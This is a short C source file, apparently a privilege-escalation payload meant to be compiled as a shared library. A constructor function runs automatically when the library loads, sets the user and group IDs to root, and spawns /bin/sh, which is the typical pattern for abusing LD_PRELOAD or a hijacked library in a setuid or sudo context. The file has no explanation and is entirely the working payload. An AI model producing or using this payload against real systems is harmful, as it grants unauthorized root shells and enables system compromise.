#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void shell(void)
{
    char * const argv[] = { "sh", NULL };
    setuid(0);
    setgid(0);
    execve("/bin/sh", argv, NULL);
    exit(1);
}
